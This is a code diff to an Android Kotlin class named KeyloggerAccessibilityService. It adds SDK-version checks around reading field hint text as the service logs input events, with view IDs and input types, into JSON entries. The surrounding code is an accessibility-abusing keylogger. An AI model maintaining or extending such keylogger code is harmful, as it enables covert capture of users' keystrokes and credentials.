@@ -57,7 +57,11 @@ class KeyloggerAccessibilityService : AccessibilityService() {
         // Extract node information for better context
         val nodeInfo = event.source
         val viewId = nodeInfo?.viewIdResourceName ?: ""
-        val hint = nodeInfo?.hintText?.toString() ?: ""
+        val hint = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            nodeInfo?.hintText?.toString() ?: ""
+        } else {
+            ""
+        }
         val inputType = getInputType(nodeInfo)
         
         val logEntry = JSONObject().apply {
@@ -92,7 +96,11 @@ class KeyloggerAccessibilityService : AccessibilityService() {
             val timestamp = System.currentTimeMillis()
             val nodeInfo = event.source
             val contentDesc = event.contentDescription?.toString() ?: ""
-            val hint = nodeInfo?.hintText?.toString() ?: ""
+            val hint = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                nodeInfo?.hintText?.toString() ?: ""
+            } else {
+                ""
+            }
             val viewId = nodeInfo?.viewIdResourceName ?: ""
             val inputType = getInputType(nodeInfo)
             
